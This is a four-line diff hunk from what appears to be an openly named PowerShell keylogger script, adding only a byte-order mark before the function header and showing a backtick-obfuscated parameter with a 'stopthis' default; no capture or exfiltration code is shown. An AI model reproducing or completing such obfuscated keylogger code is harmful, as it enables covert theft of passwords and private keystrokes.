@@ -1,4 +1,4 @@
-function Keylogger {
+﻿function Keylogger {
     [CmdletBinding()]
     param(
         [string]${mAG`IcstRi`NG} = "stopthis",
